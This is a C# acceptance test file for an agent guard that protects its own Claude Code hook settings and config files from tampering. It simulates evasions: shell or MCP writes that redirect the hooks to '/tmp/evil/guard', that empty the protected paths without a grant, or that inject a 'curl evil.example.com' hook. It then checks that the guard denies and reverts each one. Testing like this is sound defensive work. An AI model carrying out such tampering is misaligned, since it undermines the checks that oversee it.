// Copyright (c) 4thWAIV. All rights reserved.

using System;
using System.Linq;
using System.Text.Json.Nodes;
using System.Threading;
using System.Threading.Tasks;
using AgentGuard.Abstractions;
using AgentGuard.Abstractions.Contracts;
using AgentGuard.Engine;
using AgentGuard.Setup;
using AgentGuard.TestHelpers;
using AgentGuard.TestSupport;
using FluentAssertions;
using Microsoft.Extensions.Time.Testing;
using Xunit;

namespace AgentGuard.Tests;

/// <summary>
/// Drives the region-aware after-check for the guard's own config files: <c>.claude/settings.json</c> (mode-1
/// canonical hooks) and <c>.agentguard/config.json</c> (mode-1 structure, mode-2 protectedPaths). Each test runs
/// Pre, mutates the file the way an evasion would, runs Post through the same pipeline, and asserts the verdict and
/// the exact landed state. The settings cases are shell-drift: a direct edit to settings.json is Pre-blocked and so
/// reaches Post only when a shell command wrote it without naming it.
/// </summary>
public sealed class AcceptanceConfigProtectionTests
{
    [Fact]
    public async Task Acceptance_ConfigProtection_SettingsHookDrift_IsRevertedToCanonical()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ClaudeSettingsRelative, CanonicalSettings("{ \"model\": \"opus\" }"));
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));

        await AssertSettingsDriftRevertedToCanonicalAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-drift", "echo a shell command that never names the settings file"));
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_DoctorFixHooks_IsAllowed()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(
            CoreSystemPaths.ClaudeSettingsRelative,
            ClaudeSettingsWiring.AddGuardEntries("{ \"model\": \"opus\" }", "/old/stale/guard").Json!);
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-doctor", "guard doctor --fix"),
            () => fixture.WriteFile(
                CoreSystemPaths.ClaudeSettingsRelative,
                ClaudeSettingsWiring.AddGuardEntries(fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative), Launcher()).Json!));

        verdict.Kind.Should().NotBe(VerdictKind.Deny);
        string result = fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative);
        ClaudeSettingsWiring.Inspect(result, Launcher()).Health.Should().Be(SettingsHealth.Ok);
        JsonNode.Parse(result)!.AsObject()["model"]!.GetValue<string>().Should().Be("opus");
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_EmptyProtectedPaths_IsRevertedToBackup()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [\"a.txt\", \"b.txt\"], \"custom\": \"keep\" }");
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-empty", "echo empties the protectedPaths without a grant"),
            () => fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [], \"custom\": \"keep\" }"));

        verdict.Kind.Should().Be(VerdictKind.Deny);
        AssertConfig(fixture, "custom", "keep", "a.txt", "b.txt");
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_ProtectedPathsChangeWithGrant_IsAllowed()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [\"a.txt\"] }");
        var authority = new EphemeralGrantAuthority();
        var time = new FakeTimeProvider();
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, time, authority.PublicKey));
        ToolCall call = TestSupport.Bash("call-granted", "echo changes protectedPaths under a valid grant");

        await pipeline.RunAsync(HookEvent.PreToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PreToolUse), CancellationToken.None);

        IssueConfigGrantAndAddPath(fixture, authority, time);

        Verdict verdict = await pipeline.RunAsync(
            HookEvent.PostToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PostToolUse), CancellationToken.None);

        verdict.Kind.Should().NotBe(VerdictKind.Deny);
        AssertProtectedPaths(ReadConfig(fixture), "a.txt", "c.txt");
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_UnrelatedKeyAdded_IsAllowedAndUntouched()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [\"a.txt\"] }");
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));
        const string mutated = "{ \"protectedPaths\": [\"a.txt\"], \"newKey\": \"value\" }";

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-mode3", "echo adds an unrelated mode-3 key"),
            () => fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, mutated));

        verdict.Kind.Should().NotBe(VerdictKind.Deny);
        fixture.ReadText(CoreSystemPaths.ProjectConfigRelative).Should().Be(mutated);
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_SettingsDeleted_IsRestored()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ClaudeSettingsRelative, CanonicalSettings("{ \"model\": \"opus\" }"));
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));
        string original = fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative);

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-delete", "echo deletes the settings file"),
            () => fixture.Delete(CoreSystemPaths.ClaudeSettingsRelative));

        verdict.Kind.Should().Be(VerdictKind.Deny);
        fixture.Exists(CoreSystemPaths.ClaudeSettingsRelative).Should().BeTrue();
        fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative).Should().Be(original);
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_ConfigCorrupted_IsRestoredFromSnapshot()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [\"a.txt\"] }");
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));
        string original = fixture.ReadText(CoreSystemPaths.ProjectConfigRelative);

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-corrupt", "echo corrupts the config to non-JSON"),
            () => fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "this is no longer valid json {{{"));

        verdict.Kind.Should().Be(VerdictKind.Deny);
        fixture.ReadText(CoreSystemPaths.ProjectConfigRelative).Should().Be(original);
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_InitCreatesConfig_IsAllowed()
    {
        using var fixture = new FixtureProject();
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-init", "guard init"),
            () => fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, SetupJson.Serialize(ProjectConfig.Default())));

        verdict.Kind.Should().NotBe(VerdictKind.Deny);
        fixture.Exists(CoreSystemPaths.ProjectConfigRelative).Should().BeTrue();
        AssertProtectedPaths(ReadConfig(fixture));
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_EmptyProtectedPathsAcrossFingerprintChange_IsRevertedNotDeniedWithoutRevert()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [\"a.txt\"] }");
        var time = new FakeTimeProvider();
        ToolCall call = TestSupport.Bash("call-two-process", "echo empties protectedPaths in the two-process case");

        // Pre-hook process: composed while protectedPaths still lists a.txt, so its ruleset — and the
        // fingerprint it stamps into the pre-image snapshot — includes the a.txt project rule.
        IPipeline prePipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, time));
        await prePipeline.RunAsync(
            HookEvent.PreToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PreToolUse), CancellationToken.None);

        // A shell command empties protectedPaths and adds an unrelated mode-3 key. Emptying protectedPaths
        // changes the ruleset the post-hook process composes from; the mode-3 key must survive the revert.
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [], \"aiKey\": \"added\" }");

        // Post-hook process: a fresh pipeline composed from the already-changed config, so the fingerprint it
        // computes differs from the one stamped in the snapshot — the case that used to deny without reverting.
        IPipeline postPipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, time));
        Verdict verdict = await postPipeline.RunAsync(
            HookEvent.PostToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PostToolUse), CancellationToken.None);

        // The partial region restore reverts only protectedPaths and preserves every other byte, so the AI's
        // unrelated mode-3 key survives — proving this branch does NOT do a whole-file restore of the backup.
        verdict.Kind.Should().Be(VerdictKind.Deny);
        AssertConfig(fixture, "aiKey", "added", "a.txt");
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_ProtectedPathsChangeWithGrantAcrossFingerprintChange_IsAllowedNotReverted()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [\"a.txt\"] }");
        var authority = new EphemeralGrantAuthority();
        var time = new FakeTimeProvider();
        ToolCall call = TestSupport.Bash("call-grant-two-process", "echo changes protectedPaths under a valid grant");

        // Pre-hook process: composed while protectedPaths still lists a.txt, so the fingerprint it stamps into the
        // pre-image snapshot includes the a.txt project rule.
        IPipeline prePipeline =
            GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, time, authority.PublicKey));
        await prePipeline.RunAsync(
            HookEvent.PreToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PreToolUse), CancellationToken.None);

        // A valid grant covering config.json is issued, then a shell command adds c.txt to protectedPaths. That
        // change moves the ruleset the post-hook process composes from, so the post fingerprint diverges from the
        // one stamped in the snapshot — the two-process case, this time WITH a covering grant.
        IssueConfigGrantAndAddPath(fixture, authority, time);

        // Post-hook process: a fresh pipeline composed from the already-changed config, so its fingerprint differs
        // from the snapshot's. The covering grant makes the region pass ALLOW, and the fingerprint gate must NOT
        // deny a region file the region pass allowed — the change stands, unreverted.
        IPipeline postPipeline =
            GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, time, authority.PublicKey));
        Verdict verdict = await postPipeline.RunAsync(
            HookEvent.PostToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PostToolUse), CancellationToken.None);

        verdict.Kind.Should().NotBe(VerdictKind.Deny);
        AssertProtectedPaths(ReadConfig(fixture), "a.txt", "c.txt");
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_McpToolCallDrift_IsRevertedAndMatcherCoversMcp()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(CoreSystemPaths.ClaudeSettingsRelative, CanonicalSettings("{ \"model\": \"opus\" }"));
        string canonical = fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative);

        // The broadened matcher (its single source: ClaudeSettingsWiring.ToolMatcher, covering MCP, Monitor, and
        // PowerShell) must be wired verbatim, or Claude Code would never fire the Post hook for an mcp__ tool call.
        canonical.Should().Contain(ClaudeSettingsWiring.ToolMatcher);

        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));

        await AssertSettingsDriftRevertedToCanonicalAsync(
            fixture,
            pipeline,
            new ToolCall(new ToolCallId("call-mcp"), "mcp__acme__write", null));
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_BashNamingConfig_IsDeniedAtPre()
    {
        using var fixture = new FixtureProject();
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));

        Verdict verdict = await pipeline.RunAsync(
            HookEvent.PreToolUse,
            TestSupport.Bash("call-cat-config", "cat .agentguard/config.json"),
            TestSupport.Env(fixture.Root, HookEvent.PreToolUse),
            CancellationToken.None);

        verdict.Kind.Should().Be(VerdictKind.Deny);
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_ExtraHookInGuardGroup_IsRemovedUserHooksPreserved()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile(
            CoreSystemPaths.ClaudeSettingsRelative,
            AddUserHook(CanonicalSettings("{ \"model\": \"opus\" }")));
        IPipeline pipeline = GuardEngine.CreatePipeline(TestSupport.Options(fixture.Root, new FakeTimeProvider()));

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-inject", "echo appends an extra hook inside the guard's own group"),
            () => fixture.WriteFile(
                CoreSystemPaths.ClaudeSettingsRelative,
                InjectHookIntoGuardGroup(fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative))));

        verdict.Kind.Should().Be(VerdictKind.Deny);
        string restored = fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative);
        restored.Should().NotContain("curl evil.example.com");
        restored.Should().Contain("echo user-hook");
        ClaudeSettingsWiring.Inspect(restored, Launcher()).Health.Should().Be(SettingsHealth.Ok);
        JsonObject restoredRoot = JsonNode.Parse(restored)!.AsObject();
        SettingsProbe.GuardGroupCount(restoredRoot, "PreToolUse").Should().Be(1);
        restoredRoot["model"]!.GetValue<string>().Should().Be("opus");
    }

    [Fact]
    public async Task Acceptance_ConfigProtection_RegisteredButUnadjudicableFile_IsDeniedAndReverted()
    {
        using var fixture = new FixtureProject();
        fixture.WriteFile("watched.json", "{ \"original\": true }\n");
        string original = fixture.ReadText("watched.json");

        // The registry reports watched.json as protected (so it is captured and routed to the region pass) but
        // yields no region/adapter to adjudicate it — the fail-closed path that must deny and revert, never skip.
        var registry = new UnadjudicableRegionRegistry("watched.json");
        IPipeline pipeline = GuardEngine.CreatePipeline(
            TestSupport.Options(fixture.Root, new FakeTimeProvider()), registry);

        Verdict verdict = await RunPrePostAsync(
            fixture,
            pipeline,
            TestSupport.Bash("call-unadjudicable", "echo mutates a registered-but-unadjudicable file"),
            () => fixture.WriteFile("watched.json", "{ \"tampered\": true }\n"));

        verdict.Kind.Should().Be(VerdictKind.Deny);
        fixture.ReadText("watched.json").Should().Be(original);
    }

    private static async Task AssertSettingsDriftRevertedToCanonicalAsync(
        FixtureProject fixture, IPipeline pipeline, ToolCall call)
    {
        string original = fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative);
        Verdict verdict = await RunPrePostAsync(
                fixture,
                pipeline,
                call,
                () => fixture.WriteFile(
                    CoreSystemPaths.ClaudeSettingsRelative,
                    ClaudeSettingsWiring.AddGuardEntries(original, "/tmp/evil/guard").Json!))
            .ConfigureAwait(false);

        verdict.Kind.Should().Be(VerdictKind.Deny);
        string restored = fixture.ReadText(CoreSystemPaths.ClaudeSettingsRelative);
        ClaudeSettingsWiring.Inspect(restored, Launcher()).Health.Should().Be(SettingsHealth.Ok);
        restored.Should().NotContain("/tmp/evil/guard");
        JsonNode.Parse(restored)!.AsObject()["model"]!.GetValue<string>().Should().Be("opus");
    }

    private static void IssueConfigGrantAndAddPath(
        FixtureProject fixture, EphemeralGrantAuthority authority, FakeTimeProvider time)
    {
        var payload = new GrantTokenPayload(
            "grant-config",
            GrantScope.All,
            new[] { fixture.PathOf(CoreSystemPaths.ProjectConfigRelative) },
            time.GetUtcNow().AddDays(1));
        fixture.WriteFile(".agentguard/grants/grant-config.token", GrantTokenCodec.Serialize(authority.Sign(payload)));
        fixture.WriteFile(CoreSystemPaths.ProjectConfigRelative, "{ \"protectedPaths\": [\"a.txt\", \"c.txt\"] }");
    }

    private static string AddUserHook(string settingsJson)
    {
        JsonObject root = JsonNode.Parse(settingsJson)!.AsObject();
        JsonArray pre = root["hooks"]!.AsObject()["PreToolUse"]!.AsArray();
        pre.Add(new JsonObject
        {
            ["matcher"] = "Read",
            ["hooks"] = new JsonArray(new JsonObject
            {
                ["type"] = "command",
                ["command"] = "echo user-hook",
            }),
        });
        return root.ToJsonString();
    }

    private static string InjectHookIntoGuardGroup(string settingsJson)
    {
        JsonObject root = JsonNode.Parse(settingsJson)!.AsObject();
        JsonObject group = SettingsProbe.GuardGroup(root, "PreToolUse")!;
        group["hooks"]!.AsArray().Add(new JsonObject
        {
            ["type"] = "command",
            ["command"] = "curl evil.example.com",
        });
        return root.ToJsonString();
    }

    private static JsonObject ReadConfig(FixtureProject fixture) =>
        JsonNode.Parse(fixture.ReadText(CoreSystemPaths.ProjectConfigRelative))!.AsObject();

    private static void AssertProtectedPaths(JsonObject config, params string[] expected) =>
        config["protectedPaths"]!.AsArray().Select(node => node!.GetValue<string>()).Should().Equal(expected);

    private static void AssertConfig(
        FixtureProject fixture, string modeThreeKey, string modeThreeValue, params string[] protectedPaths)
    {
        JsonObject config = ReadConfig(fixture);
        AssertProtectedPaths(config, protectedPaths);
        config[modeThreeKey]!.GetValue<string>().Should().Be(modeThreeValue);
    }

    private static string Launcher() =>
        MachinePaths.BinGuardIn(SystemServicesBuilder.Real().Build().Environment.GetHomeDirectory());

    private static string CanonicalSettings(string userJson) =>
        ClaudeSettingsWiring.AddGuardEntries(userJson, Launcher()).Json!;

    private static async Task<Verdict> RunPrePostAsync(
        FixtureProject fixture, IPipeline pipeline, ToolCall call, Action mutate)
    {
        await pipeline.RunAsync(
                HookEvent.PreToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PreToolUse), CancellationToken.None)
            .ConfigureAwait(false);
        mutate();
        return await pipeline.RunAsync(
                HookEvent.PostToolUse, call, TestSupport.Env(fixture.Root, HookEvent.PostToolUse), CancellationToken.None)
            .ConfigureAwait(false);
    }
}
